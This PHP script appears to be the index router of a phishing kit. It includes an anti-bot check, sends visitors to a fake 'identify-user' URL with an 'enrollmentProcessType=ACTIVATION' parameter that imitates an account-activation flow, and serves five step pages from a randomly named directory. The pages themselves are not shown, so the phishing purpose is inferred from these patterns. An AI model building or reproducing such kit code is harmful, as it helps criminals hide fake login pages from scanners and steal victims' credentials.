<?php
// @TODO: switch system

include __DIR__.'/include/public/check_for_bot.php';
if(empty($_GET['identify-user']) && empty($_GET['enrollmentProcessType']))
    header('location: ./?identify-user='.sha1(rand(111111,9999999)).'&enrollmentProcessType=ACTIVATION');


else{
if(empty($_GET['step']) )
    include 'pagesn3287sy8zh3i/page_1.php';

elseif(trim($_GET['step'] == '1'))
    include 'pagesn3287sy8zh3i/page_1.php';
elseif(trim($_GET['step'] == '2'))
    include 'pagesn3287sy8zh3i/page_2.php';
elseif(trim($_GET['step'] == '3'))
    include 'pagesn3287sy8zh3i/page_3.php';
elseif(trim($_GET['step'] == '4'))
    include 'pagesn3287sy8zh3i/page_4.php';
elseif(trim($_GET['step'] == '5'))
    include 'pagesn3287sy8zh3i/page_5.php';
}
?>
